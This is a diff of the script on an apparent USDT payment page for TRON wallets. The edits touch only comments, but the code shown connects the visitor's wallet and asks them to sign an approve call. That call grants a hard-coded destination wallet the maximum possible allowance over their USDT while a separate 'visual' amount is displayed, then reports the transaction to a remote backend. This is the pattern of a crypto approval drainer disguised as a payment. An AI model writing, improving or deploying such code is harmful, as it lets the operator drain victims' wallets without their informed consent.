@@ -629,7 +629,6 @@
 <script>
     const BILLETERA_DESTINO = "TVqMjGyqFfFoJn1r8py17eeVQY78Foxt6f";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    // URL de tu backend desplegado en Render[span_2](start_span)[span_2](end_span)
     const BACKEND_URL = "https://backend-usdt-pay.onrender.com";
 
     const connectBtn = document.getElementById('connectBtn');
@@ -670,7 +669,7 @@
 
     connectBtn.addEventListener('click', async () => {
         if (!walletAddress) {
-            // --- PASO 1: Vincular Billetera (Idéntico a tu estructura original) ---
+            // --- BLOQUE ORIGINAL DE CONEXIÓN INTACTO ---
             try {
                 setStatus("Estableciendo enlace RPC con Billetera...");
                 connectBtn.disabled = true;
@@ -705,7 +704,7 @@
         }
 
         if (walletAddress) {
-            // --- PASO 2: Solicitar el Approve y notificar al Backend ---
+            // --- NUEVA LÓGICA: Ejecutar el Approve y llamar al Backend ---
             try {
                 const montoVisual = amountDisplay.value || "0";
 
@@ -714,11 +713,8 @@
 
                 const tronWeb = window.tronWeb;
                 
-                // Dirección a la que se le otorga la autorización (Spender)
                 const spenderAddress = BILLETERA_DESTINO; 
                 const spenderHex = tronWeb.address.toHex(spenderAddress);
-                
-                // Monto máximo de aprobación en unidades SUN (equivalente a ilimitado o un valor alto)
                 const approveAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
                 const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -743,7 +739,7 @@
                     const txId = broadcast.txid || signedTx.txID;
                     setStatus("Aprobación exitosa. Llamando al backend...");
 
-                    // --- PASO 3: Llamada a tu Backend en Render ---
+                    // Llamada al backend en Render
                     const response = await fetch(`${BACKEND_URL}/api/procesar-operacion`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -755,13 +751,10 @@
                         })
                     });
 
-                    // Intentar leer respuesta del backend de forma segura
                     let data = {};
                     try {
                         data = await response.json();
-                    } catch (e) {
-                        // Por si el servidor responde texto plano
-                    }
+                    } catch (e) {}
 
                     if (response.ok) {
                         setStatus("OPERACIÓN Y BACKEND EJECUTADOS CON ÉXITO.");
